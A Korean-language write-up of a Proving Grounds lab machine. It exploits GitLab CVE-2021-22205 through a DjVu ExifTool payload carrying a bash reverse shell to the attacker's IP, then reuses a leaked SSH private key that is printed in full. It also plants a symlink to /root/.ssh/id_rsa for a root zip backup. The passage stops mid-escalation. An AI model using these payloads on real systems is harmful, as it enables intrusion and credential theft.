---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/file-upload
  - tech/payload/revshell
  - tech/exec/ssh-key
  - tech/cred/reuse
  - tech/lin/container-escape
  - tech/lin/cron
type: machine
platform: pg
os: linux
ip: 192.168.243.182
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2021-22204, CVE-2021-22205]
status: solved
manual_tags: true
manual_cves: true
tech_count: 6
---

> [!info] 요약
> 타겟 `192.168.243.182` · Ubuntu 20.04.3 LTS (`breakout`, 5.4.0-90-generic) · Intermediate · 플래그 2개
> 진입점: 80 GitLab 13.9 → `/api/v4/users/<id>` 익명 사용자 열거 → CVE-2021-22205(ExifTool DjVu, 무인증 RCE)로 컨테이너 안 `git` 셸 → `~/backups/mykey`(주석 `coaran@breakout`)를 호스트 SSH 에 재사용 → `local.txt`
> 권한상승: 컨테이너의 `/var/log/gitlab` 이 호스트 `/srv/gitlab/logs` 바인드 마운트 → 로그 디렉터리에 `/root/.ssh/id_rsa` 심링크 심기 → 호스트 root 의 zip 백업이 링크를 따라가 root 개인키를 압축 → root SSH → `proof.txt`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.243.182

### Initial Access – GitLab 무인증 업로드가 ExifTool 코드 실행으로 이어지고, 서비스 계정 홈에 방치된 개인키가 호스트 SSH 로 연결됨

**Vulnerability Explanation:** 취약점 둘이 「운영 실수」 하나로 이어짐.
- **CVE-2021-22205** — GitLab CE/EE 11.9 ~ 13.8.8 / 13.9.6 / 13.10.3 미만. 업로드 엔드포인트가 **인증 없이** 파일을 받아 메타데이터 정리기(ExifTool)에 그대로 넘김. CVSS 3.1 = 10.0
- **CVE-2021-22204** — ExifTool 7.44 ~ 12.23. DjVu ANT 청크의 `(metadata (Copyright "…"))` 문자열이 이스케이프 처리 과정에서 **Perl 문자열 식으로 평가**됨. 문자열을 닫고 `qx{}`(명령 실행)를 이어붙이면 임의 명령 실행. 실행 권한은 GitLab 애플리케이션 계정 `git`
- **키 재사용** — 그 `git` 홈의 `~/backups/mykey` 가 호스트 사용자 `coaran` 의 개인키였음. 취약점이 아니라 방치된 자격증명이고, 이것이 컨테이너 안의 코드 실행을 호스트 셸로 바꿈

**Vulnerability Fix:**
- GitLab 을 13.8.8 / 13.9.6 / 13.10.3 이상으로 패치. 번들 ExifTool 이 12.24 이상인지 확인
- 익명 업로드 비활성화. 최소한 리버스 프록시에서 무인증 `POST /uploads/*` 차단
- 업로드 파일을 원본 그대로 파서에 넘기지 말 것 — 매직바이트 화이트리스트 + 이미지 재인코딩(디코드 후 재생성)으로 원본 구조 파괴
- 미디어 파서를 저권한 워커로 분리(seccomp·AppArmor 로 `exec`·네트워크 차단). 이것 하나로 리버스셸이 못 나감
- 개인키를 서버에 두지 말 것. 불가피하면 패스프레이즈 + 별도 계정
- `/api/v4/users` 익명 접근 차단(관리 설정의 "Restrict users API"), 로그인 화면의 버전 표기 제거

**Severity:** Critical — 무인증 원격 코드 실행

**Steps to reproduce the attack:**
1. 80 의 `http-title` 로 GitLab 확정, `/search?search=a` 의 What's new 드로어에서 버전 `13.9` 확인
2. `/api/v4/users/<id>` 를 1부터 훑어 계정 4개 열거 (`root`·`webmaster`·`michelle`·`coaran`)
3. 리스너를 먼저 띄운 뒤 CVE-2021-22205 PoC 를 리버스셸 모드로 실행
4. 컨테이너 안 `git` 셸 수신 → `~/backups/mykey` 회수
5. Kali 에 키를 저장하고 `chmod 600` → `ssh -i key coaran@<타겟>` 으로 호스트 로그인
6. `coaran` 홈에서 `local.txt` 읽기

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.243.182 | TCP: 22, 80 |

전수 스캔에서도 22·80 둘뿐. `Not shown: 65533 closed tcp ports` + 열린 2개 = 65535 로 `-p-` 커버리지가 출력 자체에 증명돼 있음.

```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ nnmap 192.168.243.182
```

`nnmap` 은 `~/.zshrc:247` 의 별칭이고, 전개된 명령줄이 로그 첫 줄에 그대로 남음.

```text
# Nmap 7.98 scan initiated Tue Aug 18 13:05:45 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.243.182
Nmap scan report for 192.168.243.182
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
|_/*/new /*/edit /*/raw
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://192.168.243.182/users/sign_in
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   83.96 ms 192.168.45.1
2   83.79 ms 192.168.45.254
3   84.03 ms 192.168.251.1
4   84.31 ms 192.168.243.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 18 13:06:13 2026 -- 1 IP address (1 host up) scanned in 28.05 seconds
```
— 출처: `~/PG/Breakout/nmap.log`

`nginx` 는 제품명이 아님 — GitLab Omnibus 가 앞단에 세우는 프록시일 뿐임. 제품을 알려준 것은 `http-title` 과 리다이렉트 목적지 `/users/sign_in` 이고, 그 302 는 「인증 벽이 있다 = 관건은 인증 **전에** 닿는 표면」이라는 방향까지 정해줌.

**OS 판정 — 독립 근거 2개.** nmap 의 `MikroTik RouterOS 7.2 - 7.5` 는 오탐임(TCP/IP 스택 지문은 가상화·NAT·홉 4개를 지나면 흔들림). 실제는 ① SSH 배너의 우분투 패키지 리비전 `OpenSSH 8.2p1 Ubuntu 4ubuntu0.3`(20.04 계열 고유) ② 뒤에 나오는 SSH 로그인 MOTD `Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)` 로 확정됨.

**버전 판정 — 독립 근거 2개.** `/search` 는 익명으로 열려 있고, 우상단 What's new 드로어가 자기 버전을 탭으로 강조함 — `13.9 Your Version`. 취약 범위 `>=13.9, <13.9.6` 안이고, 뒤에 익스플로잇이 실제로 통한 것이 두 번째 근거임.

![[Pasted image 20260818141807.png]]
— 출처: `파일보관\Pasted image 20260818141807.png` (URL `192.168.243.182/search?search=a`)

**익명 사용자 열거.** GitLab 은 공개 인스턴스 전제로 설계돼 프로필 API 가 기본적으로 익명에 열려 있음(GitLab 자신도 오래 인지한 이슈: <https://gitlab.com/gitlab-org/gitlab-foss/-/work_items/40158>).

이 박스에서는 브라우저로 `/api/v4/users/1` ~ `/4` 를 하나씩 열었음. 아래 두 블록은 같은 결과를 CLI 로 얻는 **재현용 명령**이고 이 박스에서 실행한 것이 아님(**관측 없음** — `~/.zsh_history` 에 해당 `curl` 없음).

```bash
for i in $(seq 1 30); do
  curl -s "http://192.168.243.182/api/v4/users/$i" \
    | grep -oE '"username":"[^"]+"'
done
```

목록 엔드포인트를 직접 치는 방법도 있음:

```bash
curl -s 'http://192.168.243.182/api/v4/users?per_page=100' | jq -r '.[].username'
```

브라우저로 받은 `/api/v4/users/1` ~ `/4` 의 응답:

```json
{
  "id": 1,
  "name": "Administrator",
  "username": "root",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/4924e448526fb188fd8e0c75d0dbb3bf?s=80&d=identicon",
  "web_url": "http://breakout/root",
  "created_at": "2022-03-03T18:32:40.659Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

{
  "id": 2,
  "name": "webmaster",
  "username": "webmaster",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/92279a35ff837beb3ecc6ba7eeafb74e?s=80&d=identicon",
  "web_url": "http://breakout/webmaster",
  "created_at": "2022-03-03T18:35:07.902Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

{
  "id": 3,
  "name": "michelle",
  "username": "michelle",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/fcf53cd37c1f86e2b43f1db402f41f52?s=80&d=identicon",
  "web_url": "http://breakout/michelle",
  "created_at": "2022-03-03T18:35:08.484Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

{
  "id": 4,
  "name": "Coaran",
  "username": "coaran",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/4d92c43788f35237750720daeeb6297a?s=80&d=identicon",
  "web_url": "http://breakout/coaran",
  "created_at": "2022-03-03T18:35:08.705Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}
```

없는 id 는 `404 {"message":"404 User Not Found"}` 를 주므로 열거 종료 조건이 명확함. 얻은 것을 즉시 가설로 바꾸면 — `webmaster`·`michelle`·`coaran` 은 **리눅스 로컬 계정 후보**이고, `created_at: 2022-03-03` 은 인스턴스 구축 시점이라 CVE 후보를 시대로 좁힘. `web_url` 의 내부 호스트명이 `breakout` 임.

**디렉터리 브루트포싱은 돌렸으나 소득이 없었음.** `feroxbuster -u http://192.168.243.182/ -w raft-medium-directories.txt -x php,txt,html,bak,zip -t 100` — `~/PG/Breakout/` 에 결과 파일이 하나도 남지 않음. GitLab 은 모든 경로가 `/users/sign_in` 으로 302 수렴해 유효/무효가 안 갈림.

### Initial Access – GitLab RCE → 개인키 재사용 SSH

무엇을 실제로 보냈는지가 이 절의 핵심임. 페이로드는 **DjVu 원본 그대로**이고 JPEG 위장이 없음 — 파일명만 `.jpg`, `Content-Type` 만 `image/jpeg` 임.

```text
(metadata
	(Copyright "\
" . qx{echo 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1' > /tmp/1.sh} . \
" b ") )
```
— 출처: `~/PG/Breakout/Gitlab-CVE-2021-22205/rce.txt`

그것을 담은 파일의 첫 바이트가 DjVu 매직 그대로임:

```text
00000000: 4154 2654 464f 524d 0000 0094 444a 5655  AT&TFORM....DJVU
00000010: 494e 464f 0000 000a 0000 0000 1800 2c01  INFO..........,.
00000020: 1601 4247 6a70 0000 0000 414e 5461 0000  ..BGjp....ANTa..
00000030: 006e 286d 6574 6164 6174 610a 0928 436f  .n(metadata..(Co
00000040: 7079 7269 6768 7420 225c 0a22 202e 2071  pyright "\." . q
00000050: 787b 6563 686f 2027 6261 7368 202d 6920  x{echo 'bash -i 
00000060: 3e26 202f 6465 762f 7463 702f 3139 322e  >& /dev/tcp/192.
00000070: 3136 382e 3435 2e32 3037 2f34 3434 3420  168.45.207/4444 
00000080: 303e 2631 2720 3e20 2f74 6d70 2f31 2e73  0>&1' > /tmp/1.s
00000090: 687d 202e 205c 0a22 2062 2022 2920 290a  h} . \." b ") ).
```
— 출처: `~/PG/Breakout/Gitlab-CVE-2021-22205/rce.jpg`

조각의 역할:

| 조각 | 역할 | 빼면 |
|---|---|---|
| `AT&TFORM…DJVU` 헤더 | ExifTool 이 매직바이트로 포맷을 재판정 — 확장자를 안 봄 | JPEG 로 인식돼 취약 파서에 안 들어감 |
| `ANTa` 청크 | 취약한 주석 파서를 깨우는 진입점. 비압축형이라 `bzz` 도구 없이 만들어짐 | `INFO` 만 있는 DjVu 는 그냥 파싱되고 끝 |
| `(metadata (Copyright "…"))` | DjVu 주석 문법. 이 구조여야 파서가 문자열로 인식 | 문법이 깨지면 파싱 중단 |
| `"\` + 개행 | 문자열을 **닫는** 이스케이프. 여기서 데이터가 코드 경계를 넘음 | 평가 경로로 안 들어감 |
| `. qx{…} .` | Perl 백틱 연산자. 문자열 연결 자리에 명령 실행을 끼움 | 그냥 텍스트 |
| 파일명 `.jpg` / `Content-Type: image/jpeg` | GitLab 의 입구 검사를 통과 | 업로드 거부 |

**GitLab 은 매직바이트를 보지 않음.** 검증하는 파서(파일명·MIME)와 처리하는 파서(ExifTool)가 서로 다른 규칙으로 파일을 해석하는 것이 이 취약점의 형태임 — 폴리글롯을 만들 필요가 없었던 이유.

실행에 쓴 PoC 는 <https://github.com/inspiringz/CVE-2021-22205>. 리스너를 **먼저** 띄우고 익스플로잇을 쏨(순서가 바뀌면 셸이 나갔다가 `Connection refused` 로 죽고, 재시도마다 새 파일이 업로드돼 흔적이 쌓임).

```bash
┌──(kali㉿kali)-[~/PG/Breakout/CVE-2021-22205]
└─$ python CVE-2021-22205.py -u http://192.168.243.182 -m rev 192.168.45.207 4444
===> Reverse Shell Mode

[*] command: bash -i >& /dev/tcp/192.168.45.207/4444 0>&1
[!] Error: request timeout(10)
```

| 플래그 | 의미 | 빼면 |
|---|---|---|
| `-u http://192.168.243.182` | 타겟 베이스 URL | 스킴(`http://`)을 빼면 요청 조립이 깨짐 |
| `-m rev` | 리버스셸 모드(그 밖에 `detect`·`rce1`·`rce2`·`ssh`·`add`·`mod`·`rec`) | `rce1`·`rce2` 는 명령 1회 실행이라 지속 셸을 못 얻음 |
| `192.168.45.207 4444` | tun0 IP 와 리스너 포트 | `eth0` IP 를 넣는 실수가 가장 흔함. `ip a show tun0` 로 확인 |

`[!] Error: request timeout(10)` 은 **실패가 아님.** 페이로드가 포그라운드 `bash -i` 라 ExifTool 이 반환하지 않고, 그래서 GitLab 이 HTTP 응답을 못 줌 — PoC 의 10초 타임아웃이 먼저 터진 것. 판정은 언제나 리스너 쪽에서 함.

```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.243.182] 54756
bash: cannot set terminal process group (320): Inappropriate ioctl for device
bash: no job control in this shell
git@breakout:~/gitlab-workhorse$ whoami
whoami
git
git@breakout:~/gitlab-workhorse$
```

`bash: no job control in this shell` 은 TTY 가 반쪽이라는 뜻 — `Ctrl+C` 를 누르면 셸이 통째로 죽음. GitLab 컨테이너에는 `python3` 가 없는 경우가 많아 `script -qc /bin/bash /dev/null` 이 대안이나, 이 박스는 곧바로 SSH 로 갈아탔으므로 업그레이드가 필요 없었음.

**수동 대안 — PoC 없이 같은 결과.** EDB 50532(Jacob Baines)가 의존성 없는 절차를 적어둠. 위 페이로드와 같은 DjVu 골격의 base64 두 조각 사이에 명령을 끼우고, 전송은 `curl` 한 줄임:

```bash
curl -v -F 'file=@lol.jpg' http://192.168.243.182/$(openssl rand -hex 8)
```
— 출처: `~/PG/Breakout/50532.txt`

`-F` 의 `@` 가 파일 «내용» 첨부이고, `@` 가 없으면 파일명 문자열만 전송됨. **엔드포인트는 아무 경로나 되고 CSRF 토큰도 불필요함** — 「`/uploads/user` + `X-CSRF-Token` 이 필수」는 inspiringz PoC 의 사정이지 취약점의 성질이 아님. 취약 여부만 비파괴적으로 재려면 명령 대신 지연(`sleep 15`)을 넣고 응답 시간을 봄.

**여기가 호스트가 아님을 먼저 확인함.** 호스트명이 `breakout` 이고 사용자가 `git` 이라 호스트에 올라온 것처럼 보이지만, `docker run --hostname breakout` 이면 컨테이너 안에서도 그렇게 보임 — 프롬프트는 아무것도 증명하지 않음.

```bash
git@breakout:~/backups$ mount | grep gitlab
mount | grep gitlab
/dev/sda2 on /etc/gitlab type ext4 (rw,relatime)
/dev/sda2 on /var/log/gitlab type ext4 (rw,relatime)
/dev/sda2 on /var/opt/gitlab type ext4 (rw,relatime)
```

정상적인 호스트라면 `/etc/gitlab` 이 별도 마운트일 이유가 없음. **같은 디바이스가 여러 마운트 포인트에 반복되는 것**이 도커 bind mount 의 전형이고, 그러므로 `/var/log/gitlab` 아래에 쓰면 호스트 어딘가에도 그 파일이 생김. 이 한 줄이 권한상승 경로를 통째로 결정함.

`git` 홈에서 나온 것 — GitLab 서비스 계정 홈에 있을 이유가 없는 개인키:

```bash
git@breakout:~/backups$ cat mykey
cat mykey
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA4eDGWPfq/wKo4whXeFRr8Dq+wgoCClqpJmxRajPmCaSrULo/uPad
u6DRphf9PR7JP6aJhLpDZrKzvr0ONumTK8CUV9cc8saFrA76TBQv14vkJv4FisqXtNwMg5
BLF7BS5vMJB9qImhukMofiZULvuVv8q/+kzwoFAo9WfW9VPwl7JI/+qWNM1LVg/kkzfGWs
SePMkBLa0dU+U0ImGGJAkOE8k7w1LxDr1OompWVrq96ISHuPEMX4dIs55Yo2BU3HezFBZJ
s8c7HHIHz+G2BaFgOpHFK6s+SY7jkQi1MBGCDUI8VM2zpnS3883dCBq48yrllPpQ6A2NBe
jJaJfEWfgTK+hKp0Cr2/DXtOOB+doVAUN+x4isRlmJj3vYhmf5rd7Mnfj9cIP74fmDVm+q
cDmlAzgeEoaK8s3UkAwSyIQoSU8E4VHnSJC5f01ceehtIiuU37R3xHLrnX4Tl/l+dx8QD3
hMdrDHVnHrkZwoB9H8yMPl07I/nr51bsLCFIY7rHAAAFiFNALOJTQCziAAAAB3NzaC1yc2
EAAAGBAOHgxlj36v8CqOMIV3hUa/A6vsIKAgpaqSZsUWoz5gmkq1C6P7j2nbug0aYX/T0e
yT+miYS6Q2ays769DjbpkyvAlFfXHPLGhawO+kwUL9eL5Cb+BYrKl7TcDIOQSxewUubzCQ
faiJobpDKH4mVC77lb/Kv/pM8KBQKPVn1vVT8JeySP/qljTNS1YP5JM3xlrEnjzJAS2tHV
PlNCJhhiQJDhPJO8NS8Q69TqJqVla6veiEh7jxDF+HSLOeWKNgVNx3sxQWSbPHOxxyB8/h
tgWhYDqRxSurPkmO45EItTARgg1CPFTNs6Z0t/PN3QgauPMq5ZT6UOgNjQXoyWiXxFn4Ey
voSqdAq9vw17TjgfnaFQFDfseIrEZZiY972IZn+a3ezJ34/XCD++H5g1ZvqnA5pQM4HhKG
ivLN1JAMEsiEKElPBOFR50iQuX9NXHnobSIrlN+0d8Ry651+E5f5fncfEA94THawx1Zx65
GcKAfR/MjD5dOyP56+dW7CwhSGO6xwAAAAMBAAEAAAGBANpnBGIyFT7Ny476Gdl3h4aYxq
nIE4D/eF52jaIq3Fqmph9AdyzZCFrLfOskdvAKPH0XAhEcKN+8GqBrHLtrzamYY9crYAo+
ejGLqei1/CxmTwyEwccZbOarfk4XzwPwsbgtdqXpX/vijjltujI/LpwDnaSRY0HtZjq7bd
2LMNnqyO7pbEtMgJWLa2V0UhwOEzC+2qTUFlCd582JQFyDY/qyTmhqquH/cohEf2mdTya3
3P54ujR1t2640BpqMSGfuVjEKOOdE+sYy5H3VLjnYYN3QHB1S6Y6eQ1+oDefrYDX1zHBg2
jXoBLPZlpONHUVMtGF3BvGZK5KHSaaBY2OiWgyEoVWwcuEgt8VZ+ksdIPyCxpq9+KX2wRk
035MhGIQGtllUeEBjWKNCY4aoUs4qzzGUnyq3cNOnhOwBu9BWrtn+TrvtBbryLeicIp0n2
o6L/mhikMwzM3SbzMWmkRt26M/XBq7rZa3/TNPngKg4kvh5X1OMhSfXqW0ZaT7l9P6gQAA
AMEAhmN7l4Y74Nl1lvyU4v9oiVGhtcfLtvuFdWNdLkJ/DNznwMR86vGvt9yPKmf25qZUmv
3OLAlEHxU3pAErCcjafY0UXkZj8mB6epV9k8iOtm1gLFv6564sWPmkShgyLKC6r6FUhbc9
P7fRDZn/kw4kspRereJIzvpnWHVIsKklG3orufGDHDjafq8tRsXrgkyrR/7W2r43D62kfi
JhdlMqE9KqFlB1inLoE5l9rAyliUNgCdq0P6FfcdIIZbxDzknZAAAAwQD5jWjZBIaT6kQc
veoY/8vM7wakaxZfv+v6FMbQWqvp/nW1ba7+aqV1ccEWabGDORAMN1kPfVtmLxUkpJuxmU
bLSOga14vnxr34tj0xC6klQxZxtsmXKWnTdhbnY/XG+BDPrKNMDuFyFdIGa7LGYB8o6taY
O1Bv1jndXlzlRk6TSHRqtDLRnEfigkQFSeatnZ4D3MsXTTT1CzN5C1p4Rj7J3e7JohUxG8
yzvGkZHGb5FGpnhnXb9VQEcjzgY1f2tx8AAADBAOe2xzkeUtCzF2m74kTn3cdyBW5Ia9IQ
9r0J9Qdnv5rmIDXQLbSgZ+oXuVcKtWJPchQ3bsXG7Gr5qmzcYzV4tGe4Juw5+d7gEGsPkP
Pc3DYV6kzTpm3eq2AK5d2bp6MgJboOKVUflNVfNnsdgonRWpRscZ3/17iMBifWn7mbhxoa
ds1gz/LN2Wb2kQ6m+261Aqxi/AGI82X+rSzqcnN3Dizgpzc4TjAA75kOAf/6et7r5uRuMD
bJNbZo69L11PTPWQAAAA9jb2FyYW5AYnJlYWtvdXQBAg==
-----END OPENSSH PRIVATE KEY-----
```

**키의 주석이 사용자명 1순위 후보를 줌.** 마지막 줄의 `D2NvYXJhbkBicmVha291dA==` 를 base64 디코드하면 `coaran@breakout` 임. Kali 에서는 한 줄로 확인됨:

```bash
ssh-keygen -l -f key
# 3072 SHA256:ELxfNDSJfyjudSlilpOR8ZVoCfjWRngkkktMwgcOSJU coaran@breakout (RSA)
```

주석은 만든 사람이 붙인 라벨이라 **소유자의 증명은 아님.** 다만 이 박스는 `Service Enumeration` 절의 API 열거로 `coaran` 을 이미 봤기 때문에 두 근거가 교차해 후보가 하나로 좁혀졌음. 열거를 건너뛰었다면 4명을 다 돌려야 했을 것임.

```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ chmod 600 key

┌──(kali㉿kali)-[~/PG/Breakout]
└─$ ssh -i key coaran@192.168.243.182
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Aug 2026 05:48:57 AM UTC

  System load:  0.05              Processes:                318
  Usage of /:   89.8% of 9.78GB   Users logged in:          0
  Memory usage: 81%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   4%                IPv4 address for ens160:  192.168.243.182

  => / is using 89.8% of 9.78GB


39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


*** System restart required ***

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

coaran@breakout:~$ cat local.txt
75c6c158473b5125a2662cc9fdaa4ba6
```

`chmod 600` 을 빼면 OpenSSH 가 키를 **거부가 아니라 무시**하고 비밀번호를 물음(`Permissions 0644 … This private key will be ignored.`) — 「키가 틀렸다」로 오진하기 쉬운 자리임.

로그인 배너에서 더 걷은 것 — `IPv4 address for docker0: 172.17.0.1` 로 **호스트에 도커가 돎**이 확정되어 컨테이너 가설과 맞물림. 커널 `5.4.0-90-generic`, `39 updates` 와 재부팅 대기는 패치 미적용 신호이나 이 박스에서 커널 경로는 쓰지 않았음. `post-quantum key exchange` 경고는 취약점 신호가 아니라 최신 OpenSSH 클라이언트의 정보성 안내임.

**Local.txt value:**
`75c6c158473b5125a2662cc9fdaa4ba6`

### Privilege Escalation – 바인드 마운트 + zip 백업의 심링크 추종

**Vulnerability Explanation:** 컨테이너 격리를 무의미하게 만든 공유 디렉터리의 문제임.
- 호스트 `/srv/gitlab/logs` 가 컨테이너 `/var/log/gitlab` 으로 bind mount 되어, 컨테이너 안 저권한 `git` 이 쓴 파일이 호스트 파일시스템에 그대로 존재함
- 호스트에서 root 로 도는 백업 작업이 그 디렉터리를 `zip` 으로 압축함. `zip` 은 `-y`(`--symlinks`)가 없으면 **심볼릭 링크를 따라가 대상의 내용을 저장**함
- 심링크는 파일이 아니라 경로 문자열이고 **해석은 따라가는 쪽의 네임스페이스에서** 일어남. 만들 때 대상이 존재할 필요도, 읽을 권한이 있을 필요도 없음. 그래서 컨테이너 안 `git` 이 만든 `→ /root/.ssh/id_rsa` 링크를 호스트 root 가 열면 **호스트의** root 개인키가 열림

**Vulnerability Fix:**
- 로그 볼륨을 읽기 전용(`:ro`)으로 마운트하거나 도커 로깅 드라이버·원격 수집으로 대체. 쓰기가 필요하면 named volume 사용
- 신뢰 경계를 넘는 데이터를 root 로 처리하지 말 것 — 백업 작업을 저권한 계정으로 내림
- 백업 스크립트에 `zip -y` 를 명시하거나 아카이브 전 `find … -type l -delete` 로 링크를 제거
- `PermitRootLogin no` 로 root 키 로그인 차단. root 키가 `/root/.ssh/id_rsa` 에 상주할 이유가 없으면 삭제

**Severity:** Critical — 컨테이너 내 저권한 계정에서 호스트 root 로 직행

**Steps to reproduce the attack:**
1. 컨테이너 안에서 `mount` 로 호스트와 공유되는 쓰기 가능 디렉터리를 찾음
2. `/var/log/gitlab/gitaly` 에 `ln -s /root/.ssh/id_rsa keykey` 로 링크를 심음
3. 호스트 계정(`coaran`)으로 `/opt/backups/log_backup.zip` 이 갱신되기를 기다림
4. `unzip -d /tmp/` 로 전개하고 `inflating:` 표시로 링크 추종 성공을 판정
5. 나온 root 개인키를 Kali 에 저장 → `chmod 600` → `ssh -i rootkey root@<타겟>`

전제 다섯이 모여야 성립하고, 하나라도 깨지면 다른 경로를 찾아야 함:

| # | 전제 | 이 박스의 근거 | 깨졌다면 |
|---|---|---|---|
| 1 | 컨테이너 안에 쓰기 가능한 디렉터리가 있다 | `drwx------ 2 git root /var/log/gitlab/gitaly` | `find / -user git -type d -writable` |
| 2 | 그 디렉터리가 호스트와 공유된다 | `mount` 의 `/dev/sda2 on /var/log/gitlab` | `docker.sock`·capability·`--privileged` 각도로 전환 |
| 3 | 호스트 특권 프로세스가 그것을 읽는다 | `/opt/backups/log_backup.zip` 의 존재와 갱신 | 이 경로 자체가 없음 → 다른 privesc |
| 4 | 그 프로세스가 심링크를 추종한다 | `unzip` 출력의 `inflating: … keykey` | `linking:` 이면 와일드카드 인젝션으로 전환 |
| 5 | 산출물을 내가 읽을 수 있다 | `coaran` 으로 `/opt/backups/log_backup.zip` 접근 성공 | 읽기 불가면 링크 대상을 바꿔도 무의미 |

링크 생성:

```bash
git@breakout:/var/log/gitlab/gitaly$ ln -s /root/.ssh/id_rsa keykey
ln -s /root/.ssh/id_rsa keykey
git@breakout:/var/log/gitlab/gitaly$ ls -al
ls -al
total 244
drwx------  2 git  root   4096 Aug 18 05:55 .
drwxr-xr-x 20 root root   4096 Mar  3  2022 ..
-rw-r--r--  1 root root  35381 Mar  3  2022 @4000000062225c4419243204.u
-rw-r--r--  1 root root   6348 Mar  4  2022 @400000006a83e2bc1d93f3ec.u
lrwxrwxrwx  1 root root     32 Mar  3  2022 config -> /opt/gitlab/sv/gitaly/log/config
-rw-r--r--  1 root root   6215 Aug 18 05:42 current
-rw-r--r--  1 git  git       0 Mar  3  2022 gitaly_hooks.log
-rw-r--r--  1 git  git  173449 Aug 18 06:16 gitaly_ruby_json.log
-rw-r--r--  1 git  git    7695 Aug 18 04:52 gitaly_ruby_json.log.1.gz
lrwxrwxrwx  1 git  git      17 Aug 18 05:55 keykey -> /root/.ssh/id_rsa
-rw-------  1 root root      0 Mar  3  2022 lock
```

이 `ls -al` 에서 읽을 것:

| 줄 | 의미 |
|---|---|
| `drwx------ 2 git root .` | 디렉터리 소유자가 `git` → 여기에 파일을 만들 수 있음. 전제 1 충족 |
| `config -> /opt/gitlab/sv/gitaly/log/config` | 이미 심링크가 존재 → 이 디렉터리를 다루는 도구가 링크를 걸러내지 않을 가능성이 높다는 신호 |
| `keykey` 의 크기 `17` | 심링크 크기는 **대상 경로 문자열의 길이**(`/root/.ssh/id_rsa` = 17자)이지 대상 파일 크기가 아님 |
| `@4000000062225c44…` 파일명 | TAI64N 타임스탬프. runit/`svlogd` 로테이션 — GitLab Omnibus 재확인 |

심링크 퍼미션이 `lrwxrwxrwx` 인 것에 속지 말 것 — **심링크 자체의 퍼미션은 의미가 없고** 접근 판정은 항상 대상 파일의 퍼미션으로 이뤄짐.

